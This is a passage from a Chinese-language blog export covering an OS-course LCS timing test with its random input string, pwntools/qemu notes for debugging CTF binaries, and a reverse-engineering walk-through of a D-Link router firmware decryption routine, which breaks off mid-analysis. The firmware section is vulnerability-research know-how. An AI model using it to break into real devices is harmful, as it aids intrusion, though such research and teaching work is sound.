jfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfheonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryibxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegrfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjas</span><br><span class="line"></span><br><span class="line">dnjwfhrifhiuwhcieghtughhijyiohtonyjkpuopjlpmkyojknohnmotimjoqerwsreqczdxdswdrqzfgscxfqwdeqtwfewyjhfbvkrjnhioytjkuopjkplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhlnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhritunkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcgghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyegiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkrhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhccxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhc</span><br></pre></td></tr></table></figure>
<p>命令与输出结果 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单线程</span></span><br><span class="line">time ./a.out</span><br><span class="line">1419</span><br><span class="line"></span><br><span class="line">real    0m8.628s</span><br><span class="line">user    0m0.038s</span><br><span class="line">sys     0m0.039s</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time ./plcs-64</span><br><span class="line">1419</span><br><span class="line">real    0m17.036s</span><br><span class="line">user    0m1.344s</span><br><span class="line">sys     0m0.846s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 2</span><br><span class="line">1419</span><br><span class="line">real    0m14.251s</span><br><span class="line">user    0m1.044s</span><br><span class="line">sys     0m1.093s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 4</span><br><span class="line">1419</span><br><span class="line">real    0m8.603s</span><br><span class="line">user    0m0.842s</span><br><span class="line">sys     0m2.181s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 8</span><br><span class="line">1419</span><br><span class="line">real    0m6.961s</span><br><span class="line">user    0m1.117s</span><br><span class="line">sys     0m4.643s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 16</span><br><span class="line">1418</span><br><span class="line">real    0m6.554s</span><br><span class="line">user    0m1.299s</span><br><span class="line">sys     0m5.947s</span><br></pre></td></tr></table></figure>
<h1 id="lecture-16">Lecture 16</h1>
<ol type="1">
<li><p>经常反思自己做的事情好不好。jyy老师给出的例子是“用cmd替代webpage的gpt，使对话更稳定更易保存”</p></li>
<li><p>计算机的世界里没有什么是我们搞不定的，先从简单的入手，了解原理之后再去接触复杂的（举例是
pmap 是读取 maps 实现的）</p></li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Architecture other than LinuxC</title>
    <url>/posts/5670.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下异架构的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ol type="1">
<li><a href="#1-different-language">Different Language</a>
<ul>
<li><a href="#1-1-python">python</a></li>
</ul></li>
<li><a href="#2-different-architecture">Different Architecture</a>
<ul>
<li><a href="#2-1-arm">ARM</a></li>
</ul></li>
</ol>
<h1 id="different-language">[1] Different Language</h1>
<h2 id="python">[1-1] python</h2>
<h3 id="python-链接-动态链接库">[1-1-1] python 链接 动态链接库</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 main.py 中添加:</span></span><br><span class="line">sys.path.append(<span class="string">&quot;/absolute/path/to/packagename.cpython-37m-x86_64-linux-gnu.so&quot;</span>)</span><br><span class="line"><span class="comment"># app.cpython-37m-x86_64-linux-gnu.so 中的 37m 指的是 python3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packagename</span><br></pre></td></tr></table></figure>
<h3 id="用-pwntools-调试">[1-1-2] 用 pwntools 调试</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;main.py&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h1 id="different-architecture">[2] Different Architecture</h1>
<h2 id="arm">[2-1] ARM</h2>
<p><a href="https://www.cnblogs.com/yidianhan/p/13060466.html">Manual:
ARM/mips系统调用号</a></p>
<h3 id="用-pwntools-调试-1">[2-1-1] 用 pwntools 调试</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后再开一个tmux</span></span><br><span class="line"><span class="comment"># 用 gdb-multiarch ./pwn</span></span><br><span class="line"><span class="comment"># 在 gdb 中输入 target remote:1234</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT - 某路由器mips固件解密脚本复现</title>
    <url>/posts/42047.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
期中终于结束了😭复现一下b站Wker666的固件解密
</blockquote>
<span id="more"></span>
<blockquote>
<p>第一次分析IOT固件，不当之处请指出😭</p>
</blockquote>
<h1 id="xff-前置知识">0xFF 前置知识</h1>
<ol type="1">
<li><p>多数情况下，路由器固件解包以后我们会拿到一个类似于 Linux
文件系统的文件夹，这个文件系统会跑一些三环程序，而三环程序有非常多的系统调用，因此我们希望通过这些三环程序来提权。</p></li>
<li><p>现在很多厂商会认为，自己的路由器能被解包太不安全了，因此他们会通过加密，但是每次更新换代时，后一代的固件包都是通过前一代的固件中的某个解密算法来解密的。因此，我们在挖掘
IOT
漏洞时，会先找到比较老的一些版本，分析解密算法，进而自己写出解密脚本来解密新一代的固件包。</p></li>
<li><p>(建议看到0x01后再来阅读本条)我们在路由器的 web user
上发送一个更新请求的时候，客户端会先发给服务器一个 http
请求，然后被服务器的 httpd 二进制文件接收，httpd 会 fork
一个新的进程来启用二进制文件 cgibin ，并把环境变量和 http 的请求发给 cgi
， cgi
完成处理以后，把内容输出到标准输出流之类的东西，并返回客户</p></li>
<li><p>IDA 反编译 Mips
文件会有很多“无用操作”，就是两个变量来回赋值之类的，这是由于 Mips
有分支延迟的特性</p></li>
</ol>
<h1 id="x00-准备工作">0x00 准备工作</h1>
<p><img src="https://i0.imgs.ovh/2023/11/09/lto8e.png"
alt="lto8e.png" />
上图中间有这样一句话<code>Upgrade to Firmware V2.10 and then instantly go back into the web user interface and upgrade to Firmware V2.20</code></p>
<p>它告诉我们，从web
user更新到2.2版本时，需要先从官网下载2.1的固件并更新到2.1才行</p>
<p>也就是说，2.2大概率是一个加密固件包，我们无法通过<code>binwalk</code>直接解包，但是2.1可以</p>
<p>我们download两个包到本地binwalk解包一下看看</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltiAU.png" alt="ltiAU.png" />
<figcaption aria-hidden="true">ltiAU.png</figcaption>
</figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltjx0.png" alt="ltjx0.png" />
<figcaption aria-hidden="true">ltjx0.png</figcaption>
</figure>
<p>我们可以看到，确实像我们猜想的那样，V2.1未加密，V2.2加密</p>
<h1 id="x01-定位解密逻辑">0x01 定位解密逻辑</h1>
<p>通过 <strong>0xFF.3</strong>
我们知道要分析cgibin和httpd文件，所以我们用IDA打开看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgibin : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/htdocs</span><br><span class="line"></span><br><span class="line">httpd : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/sbin</span><br></pre></td></tr></table></figure></p>
<p>我们先来分析一下在本文中不那么重要的 httpd 文件，IDA7.6
以上的版本是可以反编译 Mips 的 <img
src="https://i0.imgs.ovh/2023/11/09/l12OW.png" alt="l12OW.png" /> 我们在
function 中搜索
cgi，找到<code>process_cgi</code>函数，如上图，可以看到里面有很多环境变量如<code>GATEWAY_INTERFACE</code>和<code>CONTENT_LENGTH</code>等，在设置完环境变量后，我们可以看到它调用了<code>spawn</code>函数，我们跟进去看一下
<img src="https://i0.imgs.ovh/2023/11/09/l1ZZe.png"
alt="l1ZZe.png" /></p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1lK3.png"
alt="l1lK3.png" /> 可以看到，在 <strong>Line20</strong>
的位置，该进程是被fork起来的，而在 <strong>Line46</strong>
的位置，我们执行了 <code>execve</code> 系统调用，而我们知道 execve
的第一个参数是文件路径，第二个参数是argv，第三个参数是环境变量，因此我们回溯一下</p>
<p>而在调用 <code>spawn</code> 的图中，我们可以看到，spawn
的第一个参数是<code>*v77,v77,ptr</code>,这里的 v77 就是 file_path，而
ptr 就是 env_ptr，我们接着溯源(溯源的时候我们会发现 file_path
的调用处非常少，这是因为 ida 的反编译并没有将 file_path
的数据类型正确处理，导致 file_path 下面的一些变量，其实可能就是
file_path，但因为处理错了，所以被命名为 v78 v79 ...)</p>
<p>如下图，我们挨个分析，而当我们看到 v80 时，可以看到对 v80
被做了手脚，Wker666 说这里是对 cgi 进行一些选择，但我 STFW
以后也没找到原因，先搁置一下吧</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1tB2.png" alt="l1tB2.png" />
<figcaption aria-hidden="true">l1tB2.png</figcaption>
</figure>
<p>至此，httpd
就分析完了，httpd主要是做前端用的，它本身也有一些漏洞，不过这里就不再分析了，我们直接看cgibin</p>
<hr />
<p>我们用 IDA 打开 cgibin 文件，往下找到 seamacgi_main (这里没找到 seama
到底是什么意思，只是因为在 function 中搜索 enc 可以找到 encrypt_main
，溯源分析就能找到 semacgi_main 了) <img
src="https://i0.imgs.ovh/2023/11/09/l111j.png" alt="l111j.png" /></p>
<p>跟进 semacgi_main ,可以找到 encrypt_main
函数，这就是我们需要的解密函数了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1UfV.png" alt="l1UfV.png" />
<figcaption aria-hidden="true">l1UfV.png</figcaption>
</figure>
<h1 id="x02-解密逻辑分析">0x02 解密逻辑分析</h1>
<h3 id="被传入的参数">被传入的参数</h3>
<p>我们查看 encrypt_main 函数的引用，可以在 sub_407664+668
